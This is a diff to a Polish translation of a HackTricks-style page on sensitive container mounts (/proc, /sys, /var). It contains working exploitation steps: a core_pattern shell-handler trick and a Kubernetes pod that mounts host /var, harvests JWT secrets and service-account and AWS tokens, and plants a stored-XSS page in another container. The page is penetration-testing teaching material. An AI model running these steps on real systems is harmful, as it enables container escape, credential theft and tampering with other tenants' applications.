@@ -1,12 +1,12 @@
-# Wrażliwe montaże
+# Sensitive Mounts
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-Ekspozycja `/proc` i `/sys` bez odpowiedniej izolacji przestrzeni nazw wprowadza znaczące ryzyko bezpieczeństwa, w tym powiększenie powierzchni ataku i ujawnienie informacji. Te katalogi zawierają wrażliwe pliki, które, jeśli są źle skonfigurowane lub dostępne dla nieautoryzowanego użytkownika, mogą prowadzić do ucieczki z kontenera, modyfikacji hosta lub dostarczenia informacji wspomagających dalsze ataki. Na przykład, niewłaściwe zamontowanie `-v /proc:/host/proc` może obejść ochronę AppArmor z powodu swojej opartej na ścieżkach natury, pozostawiając `/host/proc` bez ochrony.
+Ekspozycja `/proc`, `/sys` i `/var` bez odpowiedniej izolacji przestrzeni nazw wprowadza znaczące ryzyko bezpieczeństwa, w tym powiększenie powierzchni ataku i ujawnienie informacji. Te katalogi zawierają wrażliwe pliki, które, jeśli są źle skonfigurowane lub dostępne dla nieautoryzowanego użytkownika, mogą prowadzić do ucieczki z kontenera, modyfikacji hosta lub dostarczenia informacji wspierających dalsze ataki. Na przykład, niewłaściwe zamontowanie `-v /proc:/host/proc` może obejść ochronę AppArmor z powodu swojej opartej na ścieżkach natury, pozostawiając `/host/proc` bez ochrony.
 
-**Szczegóły dotyczące każdej potencjalnej luki można znaleźć w** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
+**Szczegółowe informacje o każdej potencjalnej luce można znaleźć w** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
-## Luki w procfs
+## procfs Vulnerabilities
 
 ### `/proc/sys`
 
@@ -15,11 +15,11 @@ Ten katalog pozwala na modyfikację zmiennych jądra, zazwyczaj za pomocą `sysc
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Opisany w [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Umożliwia zdefiniowanie programu do wykonania przy generowaniu pliku core, z pierwszymi 128 bajtami jako argumentami. Może to prowadzić do wykonania kodu, jeśli plik zaczyna się od rury `|`.
+- Umożliwia zdefiniowanie programu do wykonania przy generowaniu pliku rdzenia z pierwszymi 128 bajtami jako argumentami. Może to prowadzić do wykonania kodu, jeśli plik zaczyna się od rury `|`.
 - **Przykład testowania i eksploatacji**:
 
 ```bash
-[ -w /proc/sys/kernel/core_pattern ] && echo Tak # Test dostępu do zapisu
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test dostępu do zapisu
 cd /proc/sys/kernel
 echo "|$overlay/shell.sh" > core_pattern # Ustaw niestandardowy handler
 sleep 5 && ./crash & # Wywołaj handler
@@ -72,7 +72,7 @@ echo b > /proc/sysrq-trigger # Ponownie uruchamia hosta
 #### **`/proc/kmsg`**
 
 - Ujawnia komunikaty z bufora pierścieniowego jądra.
-- Może wspierać exploity jądra, wycieki adresów i dostarczać wrażliwe informacje o systemie.
+- Może pomóc w exploitach jądra, wyciekach adresów i dostarczyć wrażliwe informacje o systemie.
 
 #### **`/proc/kallsyms`**
 
@@ -111,15 +111,15 @@ echo b > /proc/sysrq-trigger # Ponownie uruchamia hosta
 
 #### **`/proc/[pid]/mountinfo`**
 
-- Dostarcza informacje o punktach montowania w przestrzeni nazw montowania procesu.
+- Dostarcza informacji o punktach montowania w przestrzeni nazw montowania procesu.
 - Ujawnia lokalizację `rootfs` kontenera lub obrazu.
 
-### Luki w `/sys`
+### `/sys` Vulnerabilities
 
 #### **`/sys/kernel/uevent_helper`**
 
 - Używane do obsługi `uevent` urządzeń jądra.
-- Zapis do `/sys/kernel/uevent_helper` może wykonywać dowolne skrypty po wyzwoleniu `uevent`.
+- Zapis do `/sys/kernel/uevent_helper` może wykonać dowolne skrypty po wyzwoleniu `uevent`.
 - **Przykład eksploatacji**: %%%bash
 
 #### Tworzy ładunek
@@ -165,10 +165,99 @@ cat /output %%%
 - `debugfs` oferuje interfejs debugowania "bez zasad" do jądra.
 - Historia problemów z bezpieczeństwem z powodu swojej nieograniczonej natury.
 
+### `/var` Vulnerabilities
+
+Folder **/var** hosta zawiera gniazda czasu wykonywania kontenerów i systemy plików kontenerów. Jeśli ten folder jest zamontowany wewnątrz kontenera, ten kontener uzyska dostęp do odczytu i zapisu do systemów plików innych kontenerów z uprawnieniami root. Może to być wykorzystywane do przełączania się między kontenerami, powodowania odmowy usługi lub wprowadzania tylnego wejścia do innych kontenerów i aplikacji, które w nich działają.
+
+#### Kubernetes
+
+Jeśli taki kontener jest wdrażany z Kubernetes:
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+name: pod-mounts-var
+labels:
+app: pentest
+spec:
+containers:
+- name: pod-mounts-var-folder
+image: alpine
+volumeMounts:
+- mountPath: /host-var
+name: noderoot
+command: [ "/bin/sh", "-c", "--" ]
+args: [ "while true; do sleep 30; done;" ]
+volumes:
+- name: noderoot
+hostPath:
+path: /var
+```
+Wewnątrz kontenera **pod-mounts-var-folder**:
+```bash
+/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null
+
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
+<SNIP>
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh
+
+/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
+JWT_SECRET=85d<SNIP>a0
+REFRESH_TOKEN_SECRET=14<SNIP>ea
+
+/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
+<SNIP>
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html
+
+/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
+are/nginx/html/index2.html
+```
+XSS zostało osiągnięte:
+
+![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)
+
+Zauważ, że kontener NIE wymaga ponownego uruchomienia ani niczego innego. Wszelkie zmiany wprowadzone za pomocą zamontowanego **/var** folderu będą stosowane natychmiast.
+
+Możesz również zastąpić pliki konfiguracyjne, binaria, usługi, pliki aplikacji i profile powłoki, aby osiągnąć automatyczne (lub półautomatyczne) RCE.
+
+##### Dostęp do poświadczeń chmurowych
+
+Kontener może odczytywać tokeny K8s serviceaccount lub tokeny AWS webidentity, co pozwala kontenerowi uzyskać nieautoryzowany dostęp do K8s lub chmury:
+```bash
+/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
+/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
+```
+#### Docker
+
+Eksploatacja w Dockerze (lub w wdrożeniach Docker Compose) jest dokładnie taka sama, z tym że zazwyczaj systemy plików innych kontenerów są dostępne pod inną ścieżką bazową:
+```bash
+$ docker info | grep -i 'docker root\|storage driver'
+Storage Driver: overlay2
+Docker Root Dir: /var/lib/docker
+```
+Więc systemy plików znajdują się pod `/var/lib/docker/overlay2/`:
+```bash
+$ sudo ls -la /var/lib/docker/overlay2
+
+drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
+drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
+drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
+drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
+<SNIP>
+```
+#### Uwaga
+
+Rzeczywiste ścieżki mogą się różnić w różnych konfiguracjach, dlatego najlepszym rozwiązaniem jest użycie polecenia **find**, aby
+znaleźć systemy plików innych kontenerów
+
+
+
 ### Odniesienia
 
 - [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
-- [Zrozumienie i wzmacnianie kontenerów Linux](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
-- [Wykorzystywanie uprzywilejowanych i nieuprzywilejowanych kontenerów Linux](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
+- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
+- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
 
 {{#include ../../../../banners/hacktricks-training.md}}
